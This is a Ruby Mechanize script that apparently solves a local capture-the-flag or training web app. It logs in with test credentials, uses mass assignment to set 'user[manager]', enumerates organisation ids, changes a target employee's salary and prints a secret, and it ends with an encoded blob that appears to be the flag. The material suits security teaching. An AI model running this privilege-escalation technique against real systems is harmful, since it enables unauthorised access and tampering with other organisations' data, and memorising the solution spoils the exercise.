=begin
Using tamper data add a field to the user update action
user%5bmanager%5b=true

transforms our user into a manager

Now need to find the organisation id of the daily planet
Post change to organisation id
check page for Daily Planet
Stop when found
=end

require 'mechanize'

target_organisation = 'The Daily Planet'
target_name = 'Clark Kent'

Mechanize.new.instance_eval do
  get 'http://localhost:3000/users/sign_in'

  email, password = "fox1@fox.com", '123456789'

  page.forms.first.tap do |f|
    f['user[email]']                 = email
    f['user[password]']              = password
    f.submit
  end

  # Visit 'edit account' page
  page.link_with(text: 'Edit account').click

  # Upgrade myself to a manager user
  page.forms.first.tap do |f|
    f['user[manager]']          = '1'
    f['user[current_password]'] = password
    f.submit
  end

  # Iterate the organisation ids from 0 => ours
  our_org_id = page.uri.path.split('/').last.to_i

  (1..our_org_id).each do |org_id|
    page.link_with(text: 'Edit account').click
    page.forms.first.tap do |f|
      f['user[organisation_id]']  = org_id.to_s
      f['user[current_password]'] = password
      f.submit
    end
    organisation = page.search('h3').text.strip

    if target_organisation == organisation
      puts "ID: " + org_id.to_s
      # We've found the target organisation
      # Now update the target users salary
      page.link_with(text: target_name).click
      page.forms.first.tap do |f|
        f['salary[amount]'] = '25000'
        f.submit
      end

      # The secret appears, so output and exit
      puts page.search('.secret').text.strip
      exit
    end

  end
end

=begin
A3e6iApS7kQTADy9Dv+6HrdMVk0ezvkiV94uPqczFxAYZW3NmUzPzDCJfhOMFBFGdRzzRghBAhTQ5Q1kZF2P0sn+IPS2jMLXhiC
FGw6bQK4vumSVqf060CTR+TeHZ8i/qDrn6f53hLTSHbt3jDK0Ep/+ak0/Eq/1UO3okMUW5UHpJPHQesrRQ/+YCzNSe5Dm2mAnBC
oERdO+agXQhiadE3NTzRYRuqA6sYGRul6QuA+DcIGJhDncObY8gH69lyPdUCyHhPAZabBOfP+KQDXsSofAHoqTgvFEwU4m0k9Ii
unbPqJEa3DdinjfKzyeFgyS37d6QBmjBRutFmIVvLKeUq1lSes57FQOYW1zFrlcNmtk+xpM42qJMMrvJZWKkDl8NZo6Ko9P4qgo
isyc33/bk4WiozxGFwdlS1qOFwE9nvFrQ/uNvGmcU124p5XS3ZVOVPWaOkP6f4PfYu5fF5sGJ7c2i4OYrgj8WhEjOC9qeZo1Fhh
1nOZ/GPXuH2U3uKNFJUd1xDSnZTIeo3ONn/xoD6K+MlqGpSvg4wGY2UTBGpkJSns/qOqc/GsdxAYOy8FF7jWyBTnld31RIBefvs
MH4/dV72PCIg/Wfid3tSrriijHB8Ru3xR19/sw4LcUZasuWUtZ/gtYtSRneFXdhOYU5kbnLwk2zhlPt7Vo9gTiUTtbxg4tNUG9i
/FCZwV1piGo9d8Ppn6KQeHqQaouBw7p9Ew5x6+2nGu1OxqIzqNHGWHtj2BlWsGtMGN/yqF3mzkITQ3jzMWlIFsxus7rsiYy5xEC
eaQaf9G8cgXHcdzM6fIrK8V4F7WExHLA0sfw9uMQ8ti8QADnDdogNeY2FEa+EhcRrp8iqNCUdIfj0T8qbcCWcURTAhw/vwQCB2A
tqUnjAOg/TrWPrnxYpQiBnpKipd7DfY/onUFPBylSLeu4i95pVio+9X8OPu3QLCg8tGq7ESZQFGk7tAwGX+1SSEtDztPzWqckA4
JrZCk0rQj6zsi5EQFy+ZauF0ovq5mUODvzp5E4zepRDSpRH0q/E2eYenci5tK9KnUYv4YXxQC3inoXc3AJztiaoMRiV0uYGnnQt
kLlTCo8aAIGglF98ZXEnW5uzPfbK9znPR4r6p1loHfYvmIsJCFfJEykmJgOQokX+fCmvun8gQum5OKK2VLcX6m3yQrHXYLwYbio
y3g+/xa4AAkPfxOuqd4yv3e94Kjapax4EVyXhgKoZD4eDlC4pIna7VB4Ed6Ot62WdPfr8UfZiP/8RFCNlQm7CVyTLaYC3PlyUfz
McWJXGg9CASWHDtd3GMVRN1si2RJ9nQEIX8CofRh22H84IYk831+Fd6BQhWNlXB4YUeZuUm4JN1XuDw==
=end